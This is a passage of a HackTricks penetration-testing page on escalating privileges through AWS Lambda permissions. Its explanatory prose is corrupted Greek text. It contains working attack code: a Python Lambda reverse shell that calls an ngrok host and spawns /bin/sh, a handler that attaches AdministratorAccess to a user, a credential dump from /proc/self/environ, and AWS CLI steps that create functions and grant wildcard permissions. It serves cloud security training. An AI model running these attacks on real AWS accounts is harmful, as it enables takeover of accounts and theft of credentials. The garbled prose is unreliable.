# AWS - Lambda Privesc

{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ ÎºÎ±Î¹ ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ ÎºÎ±Î¹ ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¾Ï„Îµ Ï„Î¿ HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·Î½** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ hacking tricks Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± ÏƒÏ„Î¿ github.

</details>
{% endhint %}

## lambda

Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î³Î¹Î± Ï„Î¿ lambda ÏƒÏ„Î¿:

{% content-ref url="../../aws-security/aws-services/aws-lambda-enum.md" %}
[aws-lambda-enum.md](../../aws-security/aws-services/aws-lambda-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

ÎŸÎ¹ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ Î¼Îµ Ï„Î¹Ï‚ Î¬Î´ÎµÎ¹ÎµÏ‚ **`iam:PassRole`, `lambda:CreateFunction`, ÎºÎ±Î¹ `lambda:InvokeFunction`** Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± ÎºÎ»Î¹Î¼Î±ÎºÏÏƒÎ¿Ï…Î½ Ï„Î± Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î¬ Ï„Î¿Ï…Ï‚.\
ÎœÏ€Î¿ÏÎ¿ÏÎ½ Î½Î± **Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎ¿Ï…Î½ Î¼Î¹Î± Î½Î­Î± Lambda function ÎºÎ±Î¹ Î½Î± Ï„Î·Ï‚ Î±Î½Î±Î¸Î­ÏƒÎ¿Ï…Î½ Î­Î½Î±Î½ Ï…Ï€Î¬ÏÏ‡Î¿Î½Ï„Î± IAM ÏÏŒÎ»Î¿**, Î´Î¯Î½Î¿Î½Ï„Î±Ï‚ ÏƒÏ„Î· function Ï„Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Ï€Î¿Ï… ÏƒÏ‡ÎµÏ„Î¯Î¶Î¿Î½Ï„Î±Î¹ Î¼Îµ Î±Ï…Ï„ÏŒÎ½ Ï„Î¿Î½ ÏÏŒÎ»Î¿. ÎŸ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Î½Î± **Î³ÏÎ¬ÏˆÎµÎ¹ ÎºÎ±Î¹ Î½Î± Î±Î½ÎµÎ²Î¬ÏƒÎµÎ¹ ÎºÏÎ´Î¹ÎºÎ± ÏƒÎµ Î±Ï…Ï„Î® Ï„Î· Lambda function (Ï€.Ï‡. Î¼Îµ Î­Î½Î± rev shell)**.\
ÎœÏŒÎ»Î¹Ï‚ Î· function ÎµÎ¯Î½Î±Î¹ Î­Ï„Î¿Î¹Î¼Î·, Î¿ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± **ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ® Ï„Î·Ï‚** ÎºÎ±Î¹ Ï„Î¹Ï‚ Ï€ÏÎ¿Î³ÏÎ±Î¼Î¼Î±Ï„Î¹ÏƒÎ¼Î­Î½ÎµÏ‚ ÎµÎ½Î­ÏÎ³ÎµÎ¹ÎµÏ‚ ÎºÎ±Î»ÏÎ½Ï„Î±Ï‚ Ï„Î· Lambda function Î¼Î­ÏƒÏ‰ Ï„Î¿Ï… AWS API. Î‘Ï…Ï„Î® Î· Ï€ÏÎ¿ÏƒÎ­Î³Î³Î¹ÏƒÎ· ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ ÏƒÏ„Î¿Î½ Ï‡ÏÎ®ÏƒÏ„Î· Î½Î± ÎµÎºÏ„ÎµÎ»ÎµÎ¯ ÎµÏÎ³Î±ÏƒÎ¯ÎµÏ‚ Î­Î¼Î¼ÎµÏƒÎ± Î¼Î­ÏƒÏ‰ Ï„Î·Ï‚ Lambda function, Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÏÎ½Ï„Î±Ï‚ Î¼Îµ Ï„Î¿ ÎµÏ€Î¯Ï€ÎµÎ´Î¿ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Ï€Î¿Ï… Ï€Î±ÏÎ­Ï‡ÎµÏ„Î±Î¹ ÏƒÏ„Î¿Î½ IAM ÏÏŒÎ»Î¿ Ï€Î¿Ï… ÏƒÏ‡ÎµÏ„Î¯Î¶ÎµÏ„Î±Î¹ Î¼Îµ Î±Ï…Ï„Î®Î½.\\

ÎˆÎ½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯ Î±Ï…Ï„ÏŒ Î³Î¹Î± Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÎ¹ Î­Î½Î± **rev shell ÎºÎ±Î¹ Î½Î± ÎºÎ»Î­ÏˆÎµÎ¹ Ï„Î¿ token**:

{% code title="rev.py" %}
```python
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```
{% endcode %}
```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± **ÎºÎ±Ï„Î±Ï‡ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Ï„Î¿Ï… ÏÏŒÎ»Î¿Ï… lambda** Î±Ï€ÏŒ Ï„Î·Î½ Î¯Î´Î¹Î± Ï„Î· Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± lambda.\
Î‘Î½ Î¿ ÏÏŒÎ»Î¿Ï‚ lambda ÎµÎ¯Ï‡Îµ Î±ÏÎºÎµÏ„Î¬ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î±, Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ±Ï„Îµ Î½Î± Ï„Î¿Î½ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Î³Î¹Î± Î½Î± Ï€Î±ÏÎ±Ï‡Ï‰ÏÎ®ÏƒÎµÏ„Îµ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î® ÏƒÎµ ÎµÏƒÎ¬Ï‚:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
Î•Î¯Î½Î±Î¹ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î´Ï…Î½Î±Ï„ÏŒ Î½Î± Î´Î¹Î±ÏÏÎµÏÏƒÎ¿Ï…Î½ Ï„Î± Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î± Ï„Î¿Ï… ÏÏŒÎ»Î¿Ï… Ï„Î·Ï‚ lambda Ï‡Ï‰ÏÎ¯Ï‚ Î½Î± Ï‡ÏÎµÎ¹Î¬Î¶ÎµÏ„Î±Î¹ ÎµÎ¾Ï‰Ï„ÎµÏÎ¹ÎºÎ® ÏƒÏÎ½Î´ÎµÏƒÎ·. Î‘Ï…Ï„ÏŒ Î¸Î± Î®Ï„Î±Î½ Ï‡ÏÎ®ÏƒÎ¹Î¼Î¿ Î³Î¹Î± **Network isolated Lambdas** Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ½Ï„Î±Î¹ ÏƒÎµ ÎµÏƒÏ‰Ï„ÎµÏÎ¹ÎºÎ­Ï‚ ÎµÏÎ³Î±ÏƒÎ¯ÎµÏ‚. Î•Î¬Î½ Ï…Ï€Î¬ÏÏ‡Î¿Ï…Î½ Î¬Î³Î½Ï‰ÏƒÏ„ÎµÏ‚ Î¿Î¼Î¬Î´ÎµÏ‚ Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚ Ï€Î¿Ï… Ï†Î¹Î»Ï„ÏÎ¬ÏÎ¿Ï…Î½ Ï„Î± reverse shells ÏƒÎ±Ï‚, Î±Ï…Ï„ÏŒ Ï„Î¿ ÎºÎ¿Î¼Î¼Î¬Ï„Î¹ ÎºÏÎ´Î¹ÎºÎ± Î¸Î± ÏƒÎ±Ï‚ ÎµÏ€Î¹Ï„ÏÎ­ÏˆÎµÎ¹ Î½Î± Î´Î¹Î±ÏÏÎµÏÏƒÎµÏ„Îµ Î±Ï€ÎµÏ…Î¸ÎµÎ¯Î±Ï‚ Ï„Î± Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î± Ï‰Ï‚ Î­Î¾Î¿Î´Î¿ Ï„Î·Ï‚ lambda.
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**Î Î¹Î¸Î±Î½ÏŒÏ‚ Î‘Î½Ï„Î¯ÎºÏ„Ï…Ï€Î¿Ï‚:** Î†Î¼ÎµÏƒÎ¿ privesc ÏƒÏ„Î¿Î½ Î±Ï…Î¸Î±Î¯ÏÎµÏ„Î¿ ÏÏŒÎ»Î¿ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚ lambda Ï€Î¿Ï… ÎºÎ±Î¸Î¿ÏÎ¯Î¶ÎµÏ„Î±Î¹.

{% hint style="danger" %}
Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ Î±ÎºÏŒÎ¼Î± ÎºÎ±Î¹ Î±Î½ Ï†Î±Î¯Î½ÎµÏ„Î±Î¹ ÎµÎ½Î´Î¹Î±Ï†Î­ÏÎ¿Î½ Ï„Î¿ **`lambda:InvokeAsync`** **Î´ÎµÎ½** ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Î±Ï€ÏŒ Î¼ÏŒÎ½Î¿ Ï„Î¿Ï… Ï„Î·Î½ **ÎµÎºÏ„Î­Î»ÎµÏƒÎ· `aws lambda invoke-async`**, Ï‡ÏÎµÎ¹Î¬Î¶ÎµÏƒÏ„Îµ ÎµÏ€Î¯ÏƒÎ·Ï‚ Ï„Î¿ `lambda:InvokeFunction`
{% endhint %}

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

ÎŒÏ€Ï‰Ï‚ ÏƒÏ„Î¿ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î¿ ÏƒÎµÎ½Î¬ÏÎ¹Î¿, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **Ï€Î±ÏÎ±Ï‡Ï‰ÏÎ®ÏƒÎµÏ„Îµ ÏƒÏ„Î¿Î½ ÎµÎ±Ï…Ï„ÏŒ ÏƒÎ±Ï‚ Ï„Î·Î½ Î¬Î´ÎµÎ¹Î± `lambda:InvokeFunction`** Î±Î½ Î­Ï‡ÎµÏ„Îµ Ï„Î·Î½ Î¬Î´ÎµÎ¹Î± **`lambda:AddPermission`**
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**Î Î¹Î¸Î±Î½ÏŒÏ‚ Î‘Î½Ï„Î¯ÎºÏ„Ï…Ï€Î¿Ï‚:** Î†Î¼ÎµÏƒÎ· Ï€ÏÎ¿ÏÎ¸Î·ÏƒÎ· Ï€ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½ ÏƒÏ„Î¿Î½ Î±Ï…Î¸Î±Î¯ÏÎµÏ„Î¿ ÏÏŒÎ»Î¿ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚ lambda Ï€Î¿Ï… ÎºÎ±Î¸Î¿ÏÎ¯Î¶ÎµÏ„Î±Î¹.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

ÎŸÎ¹ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ Î¼Îµ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± **`iam:PassRole`, `lambda:CreateFunction`, ÎºÎ±Î¹ `lambda:CreateEventSourceMapping`** (ÎºÎ±Î¹ Ï€Î¹Î¸Î±Î½ÏÏ‚ `dynamodb:PutItem` ÎºÎ±Î¹ `dynamodb:CreateTable`) Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î­Î¼Î¼ÎµÏƒÎ± Î½Î± **Ï€ÏÎ¿Ï‰Î¸Î®ÏƒÎ¿Ï…Î½ Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î±** Î±ÎºÏŒÎ¼Î± ÎºÎ±Î¹ Ï‡Ï‰ÏÎ¯Ï‚ `lambda:InvokeFunction`.\
ÎœÏ€Î¿ÏÎ¿ÏÎ½ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎ¿Ï…Î½ Î¼Î¹Î± **Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± Lambda Î¼Îµ ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î¿ ÎºÏÎ´Î¹ÎºÎ± ÎºÎ±Î¹ Î½Î± Ï„Î·Ï‚ Î±Î½Î±Î¸Î­ÏƒÎ¿Ï…Î½ Î­Î½Î±Î½ Ï…Ï€Î¬ÏÏ‡Î¿Î½Ï„Î± ÏÏŒÎ»Î¿ IAM**.

Î‘Î½Ï„Î¯ Î½Î± ÎºÎ±Î»Î­ÏƒÎ¿Ï…Î½ Î¬Î¼ÎµÏƒÎ± Ï„Î· Lambda, Î¿ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ ÏÏ…Î¸Î¼Î¯Î¶ÎµÎ¹ Î® Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Î­Î½Î±Î½ Ï…Ï€Î¬ÏÏ‡Î¿Î½Ï„Î± Ï€Î¯Î½Î±ÎºÎ± DynamoDB, ÏƒÏ…Î½Î´Î­Î¿Î½Ï„Î¬Ï‚ Ï„Î¿Î½ Î¼Îµ Ï„Î· Lambda Î¼Î­ÏƒÏ‰ ÎµÎ½ÏŒÏ‚ event source mapping. Î‘Ï…Ï„Î® Î· ÏÏÎ¸Î¼Î¹ÏƒÎ· ÎµÎ¾Î±ÏƒÏ†Î±Î»Î¯Î¶ÎµÎ¹ ÏŒÏ„Î¹ Î· Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± Lambda **ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î±Ï…Ï„ÏŒÎ¼Î±Ï„Î± Î¼Îµ Ï„Î·Î½ ÎµÎ¹ÏƒÎ±Î³Ï‰Î³Î® ÎµÎ½ÏŒÏ‚ Î½Î­Î¿Ï… ÏƒÏ„Î¿Î¹Ï‡ÎµÎ¯Î¿Ï…** ÏƒÏ„Î¿Î½ Ï€Î¯Î½Î±ÎºÎ±, ÎµÎ¯Ï„Îµ Î±Ï€ÏŒ Ï„Î· Î´ÏÎ¬ÏƒÎ· Ï„Î¿Ï… Ï‡ÏÎ®ÏƒÏ„Î· ÎµÎ¯Ï„Îµ Î±Ï€ÏŒ Î¬Î»Î»Î· Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î±, ÎºÎ±Î»ÏÎ½Ï„Î±Ï‚ Î­Ï„ÏƒÎ¹ Î­Î¼Î¼ÎµÏƒÎ± Ï„Î· Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± Lambda ÎºÎ±Î¹ ÎµÎºÏ„ÎµÎ»ÏÎ½Ï„Î±Ï‚ Ï„Î¿Î½ ÎºÏÎ´Î¹ÎºÎ± Î¼Îµ Ï„Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Ï„Î¿Ï… Î±Î½Î±Ï„ÎµÎ¸Î­Î½Ï„Î¿Ï‚ ÏÏŒÎ»Î¿Ï… IAM.
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
Î‘Î½ Ï„Î¿ DynamoDB ÎµÎ¯Î½Î±Î¹ Î®Î´Î· ÎµÎ½ÎµÏÎ³ÏŒ ÏƒÏ„Î¿ Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½ AWS, Î¿ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ **Ï‡ÏÎµÎ¹Î¬Î¶ÎµÏ„Î±Î¹ Î¼ÏŒÎ½Î¿ Î½Î± ÎºÎ±Î¸Î¿ÏÎ¯ÏƒÎµÎ¹ Ï„Î· Ï‡Î±ÏÏ„Î¿Î³ÏÎ¬Ï†Î·ÏƒÎ· Ï€Î·Î³Î®Ï‚ ÏƒÏ…Î¼Î²Î¬Î½Ï„Ï‰Î½** Î³Î¹Î± Ï„Î· Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± Lambda. Î©ÏƒÏ„ÏŒÏƒÎ¿, Î±Î½ Ï„Î¿ DynamoDB Î´ÎµÎ½ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹, Î¿ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ Ï€ÏÎ­Ï€ÎµÎ¹ **Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î­Î½Î±Î½ Î½Î­Î¿ Ï€Î¯Î½Î±ÎºÎ±** Î¼Îµ ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î· Ï„Î· ÏÎ¿Î®:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
Î¤ÏÏÎ± ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒ Î½Î± **ÏƒÏ…Î½Î´Î­ÏƒÎµÏ„Îµ Ï„Î· Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± Lambda ÏƒÏ„Î¿Î½ Ï€Î¯Î½Î±ÎºÎ± DynamoDB** Î¼Îµ **Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± ÎµÎ½ÏŒÏ‚ event source mapping**:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
ÎœÎµ Ï„Î· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· Lambda ÏƒÏ…Î½Î´ÎµÎ´ÎµÎ¼Î­Î½Î· Î¼Îµ Ï„Î¿ DynamoDB stream, Î¿ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ **Î­Î¼Î¼ÎµÏƒÎ± Î½Î± ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Ï„Î· Lambda ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿ DynamoDB stream**. Î‘Ï…Ï„ÏŒ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÏ€Î¹Ï„ÎµÏ…Ï‡Î¸ÎµÎ¯ Î¼Îµ **Ï„Î·Î½ ÎµÎ¹ÏƒÎ±Î³Ï‰Î³Î® ÎµÎ½ÏŒÏ‚ ÏƒÏ„Î¿Î¹Ï‡ÎµÎ¯Î¿Ï…** ÏƒÏ„Î¿Î½ Ï€Î¯Î½Î±ÎºÎ± DynamoDB:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**Î Î¹Î¸Î±Î½ÏŒÏ‚ Î‘Î½Ï„Î¯ÎºÏ„Ï…Ï€Î¿Ï‚:** Î†Î¼ÎµÏƒÎ· Ï€ÏÎ¿ÏÎ¸Î·ÏƒÎ· Ï€ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½ ÏƒÏ„Î¿Î½ ÎºÎ±Î¸Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î¿ ÏÏŒÎ»Î¿ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚ lambda.

### `lambda:AddPermission`

ÎˆÎ½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Îµ Î±Ï…Ï„Î® Ï„Î·Î½ Î¬Î´ÎµÎ¹Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± **Ï€Î±ÏÎ±Ï‡Ï‰ÏÎ®ÏƒÎµÎ¹ ÏƒÏ„Î¿Î½ ÎµÎ±Ï…Ï„ÏŒ Ï„Î¿Ï… (Î® ÏƒÎµ Î¬Î»Î»Î¿Ï…Ï‚) Î¿Ï€Î¿Î¹ÎµÏƒÎ´Î®Ï€Î¿Ï„Îµ Î¬Î´ÎµÎ¹ÎµÏ‚** (Î±Ï…Ï„ÏŒ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³ÎµÎ¯ Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ­Ï‚ Î²Î±ÏƒÎ¹ÏƒÎ¼Î­Î½ÎµÏ‚ ÏƒÎµ Ï€ÏŒÏÎ¿Ï…Ï‚ Î³Î¹Î± Î½Î± Ï€Î±ÏÎ±Ï‡Ï‰ÏÎ®ÏƒÎµÎ¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿Î½ Ï€ÏŒÏÎ¿):

{% code overflow="wrap" %}
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda invoke --function-name <func_name> /tmp/outout
```
{% endcode %}

**Î Î¹Î¸Î±Î½ÏŒÏ‚ Î‘Î½Ï„Î¯ÎºÏ„Ï…Ï€Î¿Ï‚:** Î†Î¼ÎµÏƒÎ¿ privesc ÏƒÏ„Î¿Î½ ÏÏŒÎ»Î¿ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚ lambda Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹, Ï€Î±ÏÎ­Ï‡Î¿Î½Ï„Î±Ï‚ Î¬Î´ÎµÎ¹Î± Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚ Ï„Î¿Ï… ÎºÏÎ´Î¹ÎºÎ± ÎºÎ±Î¹ ÎµÎºÏ„Î­Î»ÎµÏƒÎ®Ï‚ Ï„Î¿Ï….

### `lambda:AddLayerVersionPermission`

ÎˆÎ½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Îµ Î±Ï…Ï„Î® Ï„Î·Î½ Î¬Î´ÎµÎ¹Î± Î¼Ï€Î¿ÏÎµÎ¯ **Î½Î± Ï€Î±ÏÎ±Ï‡Ï‰ÏÎ®ÏƒÎµÎ¹ ÏƒÏ„Î¿Î½ ÎµÎ±Ï…Ï„ÏŒ Ï„Î¿Ï… (Î® ÏƒÎµ Î¬Î»Î»Î¿Ï…Ï‚) Ï„Î·Î½ Î¬Î´ÎµÎ¹Î± `lambda:GetLayerVersion`**. Î˜Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± Î­Ï‡ÎµÎ¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿ layer ÎºÎ±Î¹ Î½Î± Î±Î½Î±Î¶Î·Ï„Î®ÏƒÎµÎ¹ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹ÎµÏ‚ Î® ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„ÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚.

{% code overflow="wrap" %}
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
{% endcode %}

**Î Î¹Î¸Î±Î½ÏŒÏ‚ Î‘Î½Ï„Î¯ÎºÏ„Ï…Ï€Î¿Ï‚:** Î Î¹Î¸Î±Î½Î® Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„ÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚.

### `lambda:UpdateFunctionCode`

ÎŸÎ¹ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ Ï€Î¿Ï… ÎºÎ±Ï„Î­Ï‡Î¿Ï…Î½ Ï„Î·Î½ Î¬Î´ÎµÎ¹Î± **`lambda:UpdateFunctionCode`** Î­Ï‡Î¿Ï…Î½ Ï„Î· Î´Ï…Î½Î±Ï„ÏŒÏ„Î·Ï„Î± Î½Î± **Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎ¿Ï…Î½ Ï„Î¿Î½ ÎºÏÎ´Î¹ÎºÎ± Î¼Î¹Î±Ï‚ Ï…Ï€Î¬ÏÏ‡Î¿Ï…ÏƒÎ±Ï‚ Lambda function Ï€Î¿Ï… ÏƒÏ…Î½Î´Î­ÎµÏ„Î±Î¹ Î¼Îµ Î­Î½Î±Î½ IAM ÏÏŒÎ»Î¿.**\
